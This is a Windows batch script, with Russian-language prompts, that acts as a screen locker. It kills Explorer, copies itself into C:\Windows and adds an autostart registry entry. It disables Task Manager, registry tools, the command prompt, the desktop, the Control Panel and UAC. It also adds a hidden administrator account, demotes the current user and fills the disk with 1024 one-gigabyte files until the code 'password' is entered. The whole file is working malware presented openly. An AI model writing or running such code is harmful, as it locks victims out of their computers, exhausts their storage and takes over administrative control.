@Echo off
color a
taskkill /im explorer.exe /f > nul
copy %0 C:\Windows\Win32.bat > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Win32 /t REG_SZ /d C:\Windows\Win32.bat /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD/t REG_DWORD/d 2 /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer/v NoControlPanel /t REG_DWORD /d 1 /f >nul
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
net user unlock /add
net localgroup Администраторы /add unlock
net user unlock password
net localgroup Пользователи /add %USERNAME%
net localgroup Администраторы /del %USERNAME%
for /l %%i in (1,1,1024) do fsutil file createnew C:\%%i.fuck 1073741824
cls
title Windows был заблокирован
echo Windows был заблокирован
:G
echo Введите код разблокировки:
set /p x=
if %x%==password (echo Запуск Windows...
start explorer
reg Delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 0 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD/t REG_DWORD/d 0 /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 0 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer/v NoControlPanel /t REG_DWORD /d 0 /f >nul
del C:\Windows\Win32.bat
for /l %%i in (1,1,1024) do del C:\%%i.fuck
@echo Войдите в систему под пользователем "unlock" используя пароль: password
pause
exit
) ELSE (
cls
echo Код разблокировки неправильный!
echo Введите код разблокировки еще раз.!
)
goto G